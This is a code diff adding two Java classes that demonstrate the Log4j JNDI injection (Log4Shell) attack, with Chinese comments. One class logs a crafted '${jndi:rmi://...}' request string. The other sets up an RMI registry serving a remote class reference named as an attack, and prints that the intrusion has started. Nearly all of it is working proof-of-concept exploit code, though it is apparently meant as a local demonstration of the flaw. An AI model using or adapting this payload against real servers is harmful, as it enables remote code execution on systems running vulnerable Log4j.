@@ -1,0 +1,24 @@
+
+public class BusinessServer {
+    private static final Logger log = LogManager.getLogger();
+    public static void main(String[] args){
+        // 假如这是一条请求内容，你需要把他打印出来。
+        String request = "${jndi:rmi://127.0.0.1:1100/attack}";
+        log.info("request info： {}",  request);
+    }
+}
+
+
+
+
+public class AttackClient {
+    public static void main(String[] args) throws RemoteException, MalformedURLException, AlreadyBoundException, NamingException {
+        // 本地主机上的远程对象注册表Registry的实例
+        Registry registry = LocateRegistry.createRegistry(1100);
+        Reference reference = new Reference("bug.hacker.logic.Attack", "bug.hacker.logic.Attack", "bug.hacker.logic.Attack");
+        ReferenceWrapper wrapper = new ReferenceWrapper(reference);
+        registry.bind("attack", wrapper);
+        System.out.println("代码入侵已经启动");
+    }
+}
+
